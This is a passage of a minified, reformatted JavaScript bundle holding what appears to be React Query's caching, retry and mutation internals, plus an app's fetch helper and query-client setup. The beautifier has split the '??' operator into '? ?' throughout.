        }
        onUnsubscribe() {
            var t;
            this.hasListeners() || ((t = E(this, zt)) == null || t.call(this), A(this, zt, void 0))
        }
        setEventListener(t) {
            var n;
            A(this, Hn, t), (n = E(this, zt)) == null || n.call(this), A(this, zt, t(this.setOnline.bind(this)))
        }
        setOnline(t) {
            E(this, Qn) !== t && (A(this, Qn, t), this.listeners.forEach(r => {
                r(t)
            }))
        }
        isOnline() {
            return E(this, Qn)
        }
    }, Qn = new WeakMap, zt = new WeakMap, Hn = new WeakMap, cc),
    yi = new sv;

function lv() {
    let e, t;
    const n = new Promise((o, i) => {
        e = o, t = i
    });
    n.status = "pending", n.catch(() => {});

    function r(o) {
        Object.assign(n, o), delete n.resolve, delete n.reject
    }
    return n.resolve = o => {
        r({
            status: "fulfilled",
            value: o
        }), e(o)
    }, n.reject = o => {
        r({
            status: "rejected",
            reason: o
        }), t(o)
    }, n
}

function uv(e) {
    return Math.min(1e3 * 2 ** e, 3e4)
}

function Kf(e) {
    return (e ? ? "online") === "online" ? yi.isOnline() : !0
}
var Gf = class extends Error {
    constructor(e) {
        super("CancelledError"), this.revert = e == null ? void 0 : e.revert, this.silent = e == null ? void 0 : e.silent
    }
};

function xs(e) {
    return e instanceof Gf
}

function qf(e) {
    let t = !1,
        n = 0,
        r = !1,
        o;
    const i = lv(),
        s = v => {
            var S;
            r || (h(new Gf(v)), (S = e.abort) == null || S.call(e))
        },
        l = () => {
            t = !0
        },
        u = () => {
            t = !1
        },
        a = () => Hf.isFocused() && (e.networkMode === "always" || yi.isOnline()) && e.canRun(),
        p = () => Kf(e.networkMode) && e.canRun(),
        m = v => {
            var S;
            r || (r = !0, (S = e.onSuccess) == null || S.call(e, v), o == null || o(), i.resolve(v))
        },
        h = v => {
            var S;
            r || (r = !0, (S = e.onError) == null || S.call(e, v), o == null || o(), i.reject(v))
        },
        w = () => new Promise(v => {
            var S;
            o = d => {
                (r || a()) && v(d)
            }, (S = e.onPause) == null || S.call(e)
        }).then(() => {
            var v;
            o = void 0, r || (v = e.onContinue) == null || v.call(e)
        }),
        k = () => {
            if (r) return;
            let v;
            const S = n === 0 ? e.initialPromise : void 0;
            try {
                v = S ? ? e.fn()
            } catch (d) {
                v = Promise.reject(d)
            }
            Promise.resolve(v).then(m).catch(d => {
                var P;
                if (r) return;
                const c = e.retry ? ? (Ui ? 0 : 3),
                    f = e.retryDelay ? ? uv,
                    x = typeof f == "function" ? f(n, d) : f,
                    C = c === !0 || typeof c == "number" && n < c || typeof c == "function" && c(n, d);
                if (t || !C) {
                    h(d);
                    return
                }
                n++, (P = e.onFail) == null || P.call(e, n, d), tv(x).then(() => a() ? void 0 : w()).then(() => {
                    t ? h(d) : k()
                })
            })
        };
    return {
        promise: i,
        cancel: s,
        continue: () => (o == null || o(), i),
        cancelRetry: l,
        continueRetry: u,
        canStart: p,
        start: () => (p() ? k() : w().then(k), i)
    }
}

function av() {
    let e = [],
        t = 0,
        n = l => {
            l()
        },
        r = l => {
            l()
        },
        o = l => setTimeout(l, 0);
    const i = l => {
            t ? e.push(l) : o(() => {
                n(l)
            })
        },
        s = () => {
            const l = e;
            e = [], l.length && o(() => {
                r(() => {
                    l.forEach(u => {
                        n(u)
                    })
                })
            })
        };
    return {
        batch: l => {
            let u;
            t++;
            try {
                u = l()
            } finally {
                t--, t || s()
            }
            return u
        },
        batchCalls: l => (...u) => {
            i(() => {
                l(...u)
            })
        },
        schedule: i,
        setNotifyFunction: l => {
            n = l
        },
        setBatchNotifyFunction: l => {
            r = l
        },
        setScheduler: l => {
            o = l
        }
    }
}
var Se = av(),
    dn, dc, Yf = (dc = class {
        constructor() {
            V(this, dn)
        }
        destroy() {
            this.clearGcTimeout()
        }
        scheduleGc() {
            this.clearGcTimeout(), Zy(this.gcTime) && A(this, dn, setTimeout(() => {
                this.optionalRemove()
            }, this.gcTime))
        }
        updateGcTime(e) {
            this.gcTime = Math.max(this.gcTime || 0, e ? ? (Ui ? 1 / 0 : 5 * 60 * 1e3))
        }
        clearGcTimeout() {
            E(this, dn) && (clearTimeout(E(this, dn)), A(this, dn, void 0))
        }
    }, dn = new WeakMap, dc),
    Kn, Gn, $e, ye, to, fn, Xe, mt, fc, cv = (fc = class extends Yf {
        constructor(t) {
            super();
            V(this, Xe);
            V(this, Kn);
            V(this, Gn);
            V(this, $e);
            V(this, ye);
            V(this, to);
            V(this, fn);
            A(this, fn, !1), A(this, to, t.defaultOptions), this.setOptions(t.options), this.observers = [], A(this, $e, t.cache), this.queryKey = t.queryKey, this.queryHash = t.queryHash, A(this, Kn, fv(this.options)), this.state = t.state ? ? E(this, Kn), this.scheduleGc()
        }
        get meta() {
            return this.options.meta
        }
        get promise() {
            var t;
            return (t = E(this, ye)) == null ? void 0 : t.promise
        }
        setOptions(t) {
            this.options = { ...E(this, to),
                ...t
            }, this.updateGcTime(this.options.gcTime)
        }
        optionalRemove() {
            !this.observers.length && this.state.fetchStatus === "idle" && E(this, $e).remove(this)
        }
        setData(t, n) {
            const r = nv(this.state.data, t, this.options);
            return pe(this, Xe, mt).call(this, {
                data: r,
                type: "success",
                dataUpdatedAt: n == null ? void 0 : n.updatedAt,
                manual: n == null ? void 0 : n.manual
            }), r
        }
        setState(t, n) {
            pe(this, Xe, mt).call(this, {
                type: "setState",
                state: t,
                setStateOptions: n
            })
        }
        cancel(t) {
            var r, o;
            const n = (r = E(this, ye)) == null ? void 0 : r.promise;
            return (o = E(this, ye)) == null || o.cancel(t), n ? n.then(Ye).catch(Ye) : Promise.resolve()
        }
        destroy() {
            super.destroy(), this.cancel({
                silent: !0
            })
        }
        reset() {
            this.destroy(), this.setState(E(this, Kn))
        }
        isActive() {
            return this.observers.some(t => ev(t.options.enabled, this) !== !1)
        }
        isDisabled() {
            return this.getObserversCount() > 0 ? !this.isActive() : this.options.queryFn === Eu || this.state.dataUpdateCount + this.state.errorUpdateCount === 0
        }
        isStale() {
            return this.state.isInvalidated ? !0 : this.getObserversCount() > 0 ? this.observers.some(t => t.getCurrentResult().isStale) : this.state.data === void 0
        }
        isStaleByTime(t = 0) {
            return this.state.isInvalidated || this.state.data === void 0 || !Jy(this.state.dataUpdatedAt, t)
        }
        onFocus() {
            var n;
            const t = this.observers.find(r => r.shouldFetchOnWindowFocus());
            t == null || t.refetch({
                cancelRefetch: !1
            }), (n = E(this, ye)) == null || n.continue()
        }
        onOnline() {
            var n;
            const t = this.observers.find(r => r.shouldFetchOnReconnect());
            t == null || t.refetch({
                cancelRefetch: !1
            }), (n = E(this, ye)) == null || n.continue()
        }
        addObserver(t) {
            this.observers.includes(t) || (this.observers.push(t), this.clearGcTimeout(), E(this, $e).notify({
                type: "observerAdded",
                query: this,
                observer: t
            }))
        }
        removeObserver(t) {
            this.observers.includes(t) && (this.observers = this.observers.filter(n => n !== t), this.observers.length || (E(this, ye) && (E(this, fn) ? E(this, ye).cancel({
                revert: !0
            }) : E(this, ye).cancelRetry()), this.scheduleGc()), E(this, $e).notify({
                type: "observerRemoved",
                query: this,
                observer: t
            }))
        }
        getObserversCount() {
            return this.observers.length
        }
        invalidate() {
            this.state.isInvalidated || pe(this, Xe, mt).call(this, {
                type: "invalidate"
            })
        }
        fetch(t, n) {
            var u, a, p;
            if (this.state.fetchStatus !== "idle") {
                if (this.state.data !== void 0 && (n != null && n.cancelRefetch)) this.cancel({
                    silent: !0
                });
                else if (E(this, ye)) return E(this, ye).continueRetry(), E(this, ye).promise
            }
            if (t && this.setOptions(t), !this.options.queryFn) {
                const m = this.observers.find(h => h.options.queryFn);
                m && this.setOptions(m.options)
            }
            const r = new AbortController,
                o = m => {
                    Object.defineProperty(m, "signal", {
                        enumerable: !0,
                        get: () => (A(this, fn, !0), r.signal)
                    })
                },
                i = () => {
                    const m = Qf(this.options, n),
                        h = {
                            queryKey: this.queryKey,
                            meta: this.meta
                        };
                    return o(h), A(this, fn, !1), this.options.persister ? this.options.persister(m, h, this) : m(h)
                },
                s = {
                    fetchOptions: n,
                    options: this.options,
                    queryKey: this.queryKey,
                    state: this.state,
                    fetchFn: i
                };
            o(s), (u = this.options.behavior) == null || u.onFetch(s, this), A(this, Gn, this.state), (this.state.fetchStatus === "idle" || this.state.fetchMeta !== ((a = s.fetchOptions) == null ? void 0 : a.meta)) && pe(this, Xe, mt).call(this, {
                type: "fetch",
                meta: (p = s.fetchOptions) == null ? void 0 : p.meta
            });
            const l = m => {
                var h, w, k, v;
                xs(m) && m.silent || pe(this, Xe, mt).call(this, {
                    type: "error",
                    error: m
                }), xs(m) || ((w = (h = E(this, $e).config).onError) == null || w.call(h, m, this), (v = (k = E(this, $e).config).onSettled) == null || v.call(k, this.state.data, m, this)), this.scheduleGc()
            };
            return A(this, ye, qf({
                initialPromise: n == null ? void 0 : n.initialPromise,
                fn: s.fetchFn,
                abort: r.abort.bind(r),
                onSuccess: m => {
                    var h, w, k, v;
                    if (m === void 0) {
                        l(new Error(`${this.queryHash} data is undefined`));
                        return
                    }
                    try {
                        this.setData(m)
                    } catch (S) {
                        l(S);
                        return
                    }(w = (h = E(this, $e).config).onSuccess) == null || w.call(h, m, this), (v = (k = E(this, $e).config).onSettled) == null || v.call(k, m, this.state.error, this), this.scheduleGc()
                },
                onError: l,
                onFail: (m, h) => {
                    pe(this, Xe, mt).call(this, {
                        type: "failed",
                        failureCount: m,
                        error: h
                    })
                },
                onPause: () => {
                    pe(this, Xe, mt).call(this, {
                        type: "pause"
                    })
                },
                onContinue: () => {
                    pe(this, Xe, mt).call(this, {
                        type: "continue"
                    })
                },
                retry: s.options.retry,
                retryDelay: s.options.retryDelay,
                networkMode: s.options.networkMode,
                canRun: () => !0
            })), E(this, ye).start()
        }
    }, Kn = new WeakMap, Gn = new WeakMap, $e = new WeakMap, ye = new WeakMap, to = new WeakMap, fn = new WeakMap, Xe = new WeakSet, mt = function(t) {
        const n = r => {
            switch (t.type) {
                case "failed":
                    return { ...r,
                        fetchFailureCount: t.failureCount,
                        fetchFailureReason: t.error
                    };
                case "pause":
                    return { ...r,
                        fetchStatus: "paused"
                    };
                case "continue":
                    return { ...r,
                        fetchStatus: "fetching"
                    };
                case "fetch":
                    return { ...r,
                        ...dv(r.data, this.options),
                        fetchMeta: t.meta ? ? null
                    };
                case "success":
                    return { ...r,
                        data: t.data,
                        dataUpdateCount: r.dataUpdateCount + 1,
                        dataUpdatedAt: t.dataUpdatedAt ? ? Date.now(),
                        error: null,
                        isInvalidated: !1,
                        status: "success",
                        ...!t.manual && {
                            fetchStatus: "idle",
                            fetchFailureCount: 0,
                            fetchFailureReason: null
                        }
                    };
                case "error":
                    const o = t.error;
                    return xs(o) && o.revert && E(this, Gn) ? { ...E(this, Gn),
                        fetchStatus: "idle"
                    } : { ...r,
                        error: o,
                        errorUpdateCount: r.errorUpdateCount + 1,
                        errorUpdatedAt: Date.now(),
                        fetchFailureCount: r.fetchFailureCount + 1,
                        fetchFailureReason: o,
                        fetchStatus: "idle",
                        status: "error"
                    };
                case "invalidate":
                    return { ...r,
                        isInvalidated: !0
                    };
                case "setState":
                    return { ...r,
                        ...t.state
                    }
            }
        };
        this.state = n(this.state), Se.batch(() => {
            this.observers.forEach(r => {
                r.onQueryUpdate()
            }), E(this, $e).notify({
                query: this,
                type: "updated",
                action: t
            })
        })
    }, fc);

function dv(e, t) {
    return {
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchStatus: Kf(t.networkMode) ? "fetching" : "paused",
        ...e === void 0 && {
            error: null,
            status: "pending"
        }
    }
}

function fv(e) {
    const t = typeof e.initialData == "function" ? e.initialData() : e.initialData,
        n = t !== void 0,
        r = n ? typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt : 0;
    return {
        data: t,
        dataUpdateCount: 0,
        dataUpdatedAt: n ? r ? ? Date.now() : 0,
        error: null,
        errorUpdateCount: 0,
        errorUpdatedAt: 0,
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchMeta: null,
        isInvalidated: !1,
        status: n ? "success" : "pending",
        fetchStatus: "idle"
    }
}
var lt, pc, pv = (pc = class extends bi {
        constructor(t = {}) {
            super();
            V(this, lt);
            this.config = t, A(this, lt, new Map)
        }
        build(t, n, r) {
            const o = n.queryKey,
                i = n.queryHash ? ? ku(o, n);
            let s = this.get(i);
            return s || (s = new cv({
                cache: this,
                queryKey: o,
                queryHash: i,
                options: t.defaultQueryOptions(n),
                state: r,
                defaultOptions: t.getQueryDefaults(o)
            }), this.add(s)), s
        }
        add(t) {
            E(this, lt).has(t.queryHash) || (E(this, lt).set(t.queryHash, t), this.notify({
                type: "added",
                query: t
            }))
        }
        remove(t) {
            const n = E(this, lt).get(t.queryHash);
            n && (t.destroy(), n === t && E(this, lt).delete(t.queryHash), this.notify({
                type: "removed",
                query: t
            }))
        }
        clear() {
            Se.batch(() => {
                this.getAll().forEach(t => {
                    this.remove(t)
                })
            })
        }
        get(t) {
            return E(this, lt).get(t)
        }
        getAll() {
            return [...E(this, lt).values()]
        }
        find(t) {
            const n = {
                exact: !0,
                ...t
            };
            return this.getAll().find(r => Ha(n, r))
        }
        findAll(t = {}) {
            const n = this.getAll();
            return Object.keys(t).length > 0 ? n.filter(r => Ha(t, r)) : n
        }
        notify(t) {
            Se.batch(() => {
                this.listeners.forEach(n => {
                    n(t)
                })
            })
        }
        onFocus() {
            Se.batch(() => {
                this.getAll().forEach(t => {
                    t.onFocus()
                })
            })
        }
        onOnline() {
            Se.batch(() => {
                this.getAll().forEach(t => {
                    t.onOnline()
                })
            })
        }
    }, lt = new WeakMap, pc),
    ut, we, pn, at, Lt, hc, hv = (hc = class extends Yf {
        constructor(t) {
            super();
            V(this, at);
            V(this, ut);
            V(this, we);
            V(this, pn);
            this.mutationId = t.mutationId, A(this, we, t.mutationCache), A(this, ut, []), this.state = t.state || mv(), this.setOptions(t.options), this.scheduleGc()
        }
        setOptions(t) {
            this.options = t, this.updateGcTime(this.options.gcTime)
        }
        get meta() {
            return this.options.meta
        }
        addObserver(t) {
            E(this, ut).includes(t) || (E(this, ut).push(t), this.clearGcTimeout(), E(this, we).notify({
                type: "observerAdded",
                mutation: this,
                observer: t
            }))
        }
        removeObserver(t) {
            A(this, ut, E(this, ut).filter(n => n !== t)), this.scheduleGc(), E(this, we).notify({
                type: "observerRemoved",
                mutation: this,
                observer: t
            })
        }
        optionalRemove() {
            E(this, ut).length || (this.state.status === "pending" ? this.scheduleGc() : E(this, we).remove(this))
        }
        continue () {
            var t;
            return ((t = E(this, pn)) == null ? void 0 : t.continue()) ? ? this.execute(this.state.variables)
        }
        async execute(t) {
            var o, i, s, l, u, a, p, m, h, w, k, v, S, d, c, f, x, C, P, N;
            A(this, pn, qf({
                fn: () => this.options.mutationFn ? this.options.mutationFn(t) : Promise.reject(new Error("No mutationFn found")),
                onFail: (_, M) => {
                    pe(this, at, Lt).call(this, {
                        type: "failed",
                        failureCount: _,
                        error: M
                    })
                },
                onPause: () => {
                    pe(this, at, Lt).call(this, {
                        type: "pause"
                    })
                },
                onContinue: () => {
                    pe(this, at, Lt).call(this, {
                        type: "continue"
                    })
                },
                retry: this.options.retry ? ? 0,
                retryDelay: this.options.retryDelay,
                networkMode: this.options.networkMode,
                canRun: () => E(this, we).canRun(this)
            }));
            const n = this.state.status === "pending",
                r = !E(this, pn).canStart();
            try {
                if (!n) {
                    pe(this, at, Lt).call(this, {
                        type: "pending",
                        variables: t,
                        isPaused: r
                    }), await ((i = (o = E(this, we).config).onMutate) == null ? void 0 : i.call(o, t, this));
                    const M = await ((l = (s = this.options).onMutate) == null ? void 0 : l.call(s, t));
                    M !== this.state.context && pe(this, at, Lt).call(this, {
                        type: "pending",
                        context: M,
                        variables: t,
                        isPaused: r
                    })
                }
                const _ = await E(this, pn).start();
                return await ((a = (u = E(this, we).config).onSuccess) == null ? void 0 : a.call(u, _, t, this.state.context, this)), await ((m = (p = this.options).onSuccess) == null ? void 0 : m.call(p, _, t, this.state.context)), await ((w = (h = E(this, we).config).onSettled) == null ? void 0 : w.call(h, _, null, this.state.variables, this.state.context, this)), await ((v = (k = this.options).onSettled) == null ? void 0 : v.call(k, _, null, t, this.state.context)), pe(this, at, Lt).call(this, {
                    type: "success",
                    data: _
                }), _
            } catch (_) {
                try {
                    throw await ((d = (S = E(this, we).config).onError) == null ? void 0 : d.call(S, _, t, this.state.context, this)), await ((f = (c = this.options).onError) == null ? void 0 : f.call(c, _, t, this.state.context)), await ((C = (x = E(this, we).config).onSettled) == null ? void 0 : C.call(x, void 0, _, this.state.variables, this.state.context, this)), await ((N = (P = this.options).onSettled) == null ? void 0 : N.call(P, void 0, _, t, this.state.context)), _
                } finally {
                    pe(this, at, Lt).call(this, {
                        type: "error",
                        error: _
                    })
                }
            } finally {
                E(this, we).runNext(this)
            }
        }
    }, ut = new WeakMap, we = new WeakMap, pn = new WeakMap, at = new WeakSet, Lt = function(t) {
        const n = r => {
            switch (t.type) {
                case "failed":
                    return { ...r,
                        failureCount: t.failureCount,
                        failureReason: t.error
                    };
                case "pause":
                    return { ...r,
                        isPaused: !0
                    };
                case "continue":
                    return { ...r,
                        isPaused: !1
                    };
                case "pending":
                    return { ...r,
                        context: t.context,
                        data: void 0,
                        failureCount: 0,
                        failureReason: null,
                        error: null,
                        isPaused: t.isPaused,
                        status: "pending",
                        variables: t.variables,
                        submittedAt: Date.now()
                    };
                case "success":
                    return { ...r,
                        data: t.data,
                        failureCount: 0,
                        failureReason: null,
                        error: null,
                        status: "success",
                        isPaused: !1
                    };
                case "error":
                    return { ...r,
                        data: void 0,
                        error: t.error,
                        failureCount: r.failureCount + 1,
                        failureReason: t.error,
                        isPaused: !1,
                        status: "error"
                    }
            }
        };
        this.state = n(this.state), Se.batch(() => {
            E(this, ut).forEach(r => {
                r.onMutationUpdate(t)
            }), E(this, we).notify({
                mutation: this,
                type: "updated",
                action: t
            })
        })
    }, hc);

function mv() {
    return {
        context: void 0,
        data: void 0,
        error: null,
        failureCount: 0,
        failureReason: null,
        isPaused: !1,
        status: "idle",
        variables: void 0,
        submittedAt: 0
    }
}
var Le, no, mc, yv = (mc = class extends bi {
    constructor(t = {}) {
        super();
        V(this, Le);
        V(this, no);
        this.config = t, A(this, Le, new Map), A(this, no, Date.now())
    }
    build(t, n, r) {
        const o = new hv({
            mutationCache: this,
            mutationId: ++ao(this, no)._,
            options: t.defaultMutationOptions(n),
            state: r
        });
        return this.add(o), o
    }
    add(t) {
        const n = Ro(t),
            r = E(this, Le).get(n) ? ? [];
        r.push(t), E(this, Le).set(n, r), this.notify({
            type: "added",
            mutation: t
        })
    }
    remove(t) {
        var r;
        const n = Ro(t);
        if (E(this, Le).has(n)) {
            const o = (r = E(this, Le).get(n)) == null ? void 0 : r.filter(i => i !== t);
            o && (o.length === 0 ? E(this, Le).delete(n) : E(this, Le).set(n, o))
        }
        this.notify({
            type: "removed",
            mutation: t
        })
    }
    canRun(t) {
        var r;
        const n = (r = E(this, Le).get(Ro(t))) == null ? void 0 : r.find(o => o.state.status === "pending");
        return !n || n === t
    }
    runNext(t) {
        var r;
        const n = (r = E(this, Le).get(Ro(t))) == null ? void 0 : r.find(o => o !== t && o.state.isPaused);
        return (n == null ? void 0 : n.continue()) ? ? Promise.resolve()
    }
    clear() {
        Se.batch(() => {
            this.getAll().forEach(t => {
                this.remove(t)
            })
        })
    }
    getAll() {
        return [...E(this, Le).values()].flat()
    }
    find(t) {
        const n = {
            exact: !0,
            ...t
        };
        return this.getAll().find(r => Ka(n, r))
    }
    findAll(t = {}) {
        return this.getAll().filter(n => Ka(t, n))
    }
    notify(t) {
        Se.batch(() => {
            this.listeners.forEach(n => {
                n(t)
            })
        })
    }
    resumePausedMutations() {
        const t = this.getAll().filter(n => n.state.isPaused);
        return Se.batch(() => Promise.all(t.map(n => n.continue().catch(Ye))))
    }
}, Le = new WeakMap, no = new WeakMap, mc);

function Ro(e) {
    var t;
    return ((t = e.options.scope) == null ? void 0 : t.id) ? ? String(e.mutationId)
}

function Ya(e) {
    return {
        onFetch: (t, n) => {
            var p, m, h, w, k;
            const r = t.options,
                o = (h = (m = (p = t.fetchOptions) == null ? void 0 : p.meta) == null ? void 0 : m.fetchMore) == null ? void 0 : h.direction,
                i = ((w = t.state.data) == null ? void 0 : w.pages) || [],
                s = ((k = t.state.data) == null ? void 0 : k.pageParams) || [];
            let l = {
                    pages: [],
                    pageParams: []
                },
                u = 0;
            const a = async () => {
                let v = !1;
                const S = f => {
                        Object.defineProperty(f, "signal", {
                            enumerable: !0,
                            get: () => (t.signal.aborted ? v = !0 : t.signal.addEventListener("abort", () => {
                                v = !0
                            }), t.signal)
                        })
                    },
                    d = Qf(t.options, t.fetchOptions),
                    c = async (f, x, C) => {
                        if (v) return Promise.reject();
                        if (x == null && f.pages.length) return Promise.resolve(f);
                        const P = {
                            queryKey: t.queryKey,
                            pageParam: x,
                            direction: C ? "backward" : "forward",
                            meta: t.options.meta
                        };
                        S(P);
                        const N = await d(P),
                            {
                                maxPages: _
                            } = t.options,
                            M = C ? ov : rv;
                        return {
                            pages: M(f.pages, N, _),
                            pageParams: M(f.pageParams, x, _)
                        }
                    };
                if (o && i.length) {
                    const f = o === "backward",
                        x = f ? vv : Xa,
                        C = {
                            pages: i,
                            pageParams: s
                        },
                        P = x(r, C);
                    l = await c(C, P, f)
                } else {
                    const f = e ? ? i.length;
                    do {
                        const x = u === 0 ? s[0] ? ? r.initialPageParam : Xa(r, l);
                        if (u > 0 && x == null) break;
                        l = await c(l, x), u++
                    } while (u < f)
                }
                return l
            };
            t.options.persister ? t.fetchFn = () => {
                var v, S;
                return (S = (v = t.options).persister) == null ? void 0 : S.call(v, a, {
                    queryKey: t.queryKey,
                    meta: t.options.meta,
                    signal: t.signal
                }, n)
            } : t.fetchFn = a
        }
    }
}

function Xa(e, {
    pages: t,
    pageParams: n
}) {
    const r = t.length - 1;
    return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0
}

function vv(e, {
    pages: t,
    pageParams: n
}) {
    var r;
    return t.length > 0 ? (r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n) : void 0
}
var ee, bt, Ut, qn, Yn, $t, Xn, Zn, yc, gv = (yc = class {
        constructor(e = {}) {
            V(this, ee);
            V(this, bt);
            V(this, Ut);
            V(this, qn);
            V(this, Yn);
            V(this, $t);
            V(this, Xn);
            V(this, Zn);
            A(this, ee, e.queryCache || new pv), A(this, bt, e.mutationCache || new yv), A(this, Ut, e.defaultOptions || {}), A(this, qn, new Map), A(this, Yn, new Map), A(this, $t, 0)
        }
        mount() {
            ao(this, $t)._++, E(this, $t) === 1 && (A(this, Xn, Hf.subscribe(async e => {
                e && (await this.resumePausedMutations(), E(this, ee).onFocus())
            })), A(this, Zn, yi.subscribe(async e => {
                e && (await this.resumePausedMutations(), E(this, ee).onOnline())
            })))
        }
        unmount() {
            var e, t;
            ao(this, $t)._--, E(this, $t) === 0 && ((e = E(this, Xn)) == null || e.call(this), A(this, Xn, void 0), (t = E(this, Zn)) == null || t.call(this), A(this, Zn, void 0))
        }
        isFetching(e) {
            return E(this, ee).findAll({ ...e,
                fetchStatus: "fetching"
            }).length
        }
        isMutating(e) {
            return E(this, bt).findAll({ ...e,
                status: "pending"
            }).length
        }
        getQueryData(e) {
            var n;
            const t = this.defaultQueryOptions({
                queryKey: e
            });
            return (n = E(this, ee).get(t.queryHash)) == null ? void 0 : n.state.data
        }
        ensureQueryData(e) {
            const t = this.getQueryData(e.queryKey);
            if (t === void 0) return this.fetchQuery(e); {
                const n = this.defaultQueryOptions(e),
                    r = E(this, ee).build(this, n);
                return e.revalidateIfStale && r.isStaleByTime(Qa(n.staleTime, r)) && this.prefetchQuery(n), Promise.resolve(t)
            }
        }
        getQueriesData(e) {
            return E(this, ee).findAll(e).map(({
                queryKey: t,
                state: n
            }) => {
                const r = n.data;
                return [t, r]
            })
        }
        setQueryData(e, t, n) {
            const r = this.defaultQueryOptions({
                    queryKey: e
                }),
                o = E(this, ee).get(r.queryHash),
                i = o == null ? void 0 : o.state.data,
                s = Xy(t, i);
            if (s !== void 0) return E(this, ee).build(this, r).setData(s, { ...n,
                manual: !0
            })
        }
        setQueriesData(e, t, n) {
            return Se.batch(() => E(this, ee).findAll(e).map(({
                queryKey: r
            }) => [r, this.setQueryData(r, t, n)]))
        }
        getQueryState(e) {
            var n;
            const t = this.defaultQueryOptions({
                queryKey: e
            });
            return (n = E(this, ee).get(t.queryHash)) == null ? void 0 : n.state
        }
        removeQueries(e) {
            const t = E(this, ee);
            Se.batch(() => {
                t.findAll(e).forEach(n => {
                    t.remove(n)
                })
            })
        }
        resetQueries(e, t) {
            const n = E(this, ee),
                r = {
                    type: "active",
                    ...e
                };
            return Se.batch(() => (n.findAll(e).forEach(o => {
                o.reset()
            }), this.refetchQueries(r, t)))
        }
        cancelQueries(e = {}, t = {}) {
            const n = {
                    revert: !0,
                    ...t
                },
                r = Se.batch(() => E(this, ee).findAll(e).map(o => o.cancel(n)));
            return Promise.all(r).then(Ye).catch(Ye)
        }
        invalidateQueries(e = {}, t = {}) {
            return Se.batch(() => {
                if (E(this, ee).findAll(e).forEach(r => {
                        r.invalidate()
                    }), e.refetchType === "none") return Promise.resolve();
                const n = { ...e,
                    type: e.refetchType ? ? e.type ? ? "active"
                };
                return this.refetchQueries(n, t)
            })
        }
        refetchQueries(e = {}, t) {
            const n = { ...t,
                    cancelRefetch: (t == null ? void 0 : t.cancelRefetch) ? ? !0
                },
                r = Se.batch(() => E(this, ee).findAll(e).filter(o => !o.isDisabled()).map(o => {
                    let i = o.fetch(void 0, n);
                    return n.throwOnError || (i = i.catch(Ye)), o.state.fetchStatus === "paused" ? Promise.resolve() : i
                }));
            return Promise.all(r).then(Ye)
        }
        fetchQuery(e) {
            const t = this.defaultQueryOptions(e);
            t.retry === void 0 && (t.retry = !1);
            const n = E(this, ee).build(this, t);
            return n.isStaleByTime(Qa(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data)
        }
        prefetchQuery(e) {
            return this.fetchQuery(e).then(Ye).catch(Ye)
        }
        fetchInfiniteQuery(e) {
            return e.behavior = Ya(e.pages), this.fetchQuery(e)
        }
        prefetchInfiniteQuery(e) {
            return this.fetchInfiniteQuery(e).then(Ye).catch(Ye)
        }
        ensureInfiniteQueryData(e) {
            return e.behavior = Ya(e.pages), this.ensureQueryData(e)
        }
        resumePausedMutations() {
            return yi.isOnline() ? E(this, bt).resumePausedMutations() : Promise.resolve()
        }
        getQueryCache() {
            return E(this, ee)
        }
        getMutationCache() {
            return E(this, bt)
        }
        getDefaultOptions() {
            return E(this, Ut)
        }
        setDefaultOptions(e) {
            A(this, Ut, e)
        }
        setQueryDefaults(e, t) {
            E(this, qn).set(Zr(e), {
                queryKey: e,
                defaultOptions: t
            })
        }
        getQueryDefaults(e) {
            const t = [...E(this, qn).values()];
            let n = {};
            return t.forEach(r => {
                Jr(e, r.queryKey) && (n = { ...n,
                    ...r.defaultOptions
                })
            }), n
        }
        setMutationDefaults(e, t) {
            E(this, Yn).set(Zr(e), {
                mutationKey: e,
                defaultOptions: t
            })
        }
        getMutationDefaults(e) {
            const t = [...E(this, Yn).values()];
            let n = {};
            return t.forEach(r => {
                Jr(e, r.mutationKey) && (n = { ...n,
                    ...r.defaultOptions
                })
            }), n
        }
        defaultQueryOptions(e) {
            if (e._defaulted) return e;
            const t = { ...E(this, Ut).queries,
                ...this.getQueryDefaults(e.queryKey),
                ...e,
                _defaulted: !0
            };
            return t.queryHash || (t.queryHash = ku(t.queryKey, t)), t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"), t.throwOnError === void 0 && (t.throwOnError = !!t.suspense), !t.networkMode && t.persister && (t.networkMode = "offlineFirst"), t.enabled !== !0 && t.queryFn === Eu && (t.enabled = !1), t
        }
        defaultMutationOptions(e) {
            return e != null && e._defaulted ? e : { ...E(this, Ut).mutations,
                ...(e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey),
                ...e,
                _defaulted: !0
            }
        }
        clear() {
            E(this, ee).clear(), E(this, bt).clear()
        }
    }, ee = new WeakMap, bt = new WeakMap, Ut = new WeakMap, qn = new WeakMap, Yn = new WeakMap, $t = new WeakMap, Xn = new WeakMap, Zn = new WeakMap, yc),
    wv = g.createContext(void 0),
    xv = ({
        client: e,
        children: t
    }) => (g.useEffect(() => (e.mount(), () => {
        e.unmount()
    }), [e]), y.jsx(wv.Provider, {
        value: e,
        children: t
    }));
async function Xf(e) {
    if (!e.ok) {
        const t = await e.text() || e.statusText;
        throw new Error(`${e.status}: ${t}`)
    }
}
async function wl(e, t, n) {
    const r = await fetch(t, {
        method: e,
        headers: n ? {
            "Content-Type": "application/json"
        } : {},
        body: n ? JSON.stringify(n) : void 0,
        credentials: "include"
    });
    return await Xf(r), r
}
const Sv = ({
        on401: e
    }) => async ({
        queryKey: t
    }) => {
        const n = await fetch(t[0], {
            credentials: "include"
        });
        return e === "returnNull" && n.status === 401 ? null : (await Xf(n), await n.json())
    },
    kv = new gv({
        defaultOptions: {
            queries: {
                queryFn: Sv({
                    on401: "throw"
                }),
                refetchInterval: !1,
                refetchOnWindowFocus: !1,
                staleTime: 1 / 0,
                retry: !1
            },
            mutations: {
                retry: !1
            }
        }
    }),
    Ev = 1,
    Cv = 1e6;
let Ss = 0;

function Pv() {
    return Ss = (Ss + 1) % Number.MAX_SAFE_INTEGER, Ss.toString()
}
const ks = new Map,
    Za = e => {
        if (ks.has(e)) return;
        const t = setTimeout(() => {
            ks.delete(e), Ir({
                type: "REMOVE_TOAST",
                toastId: e
            })
        }, Cv);
        ks.set(e, t)
    },
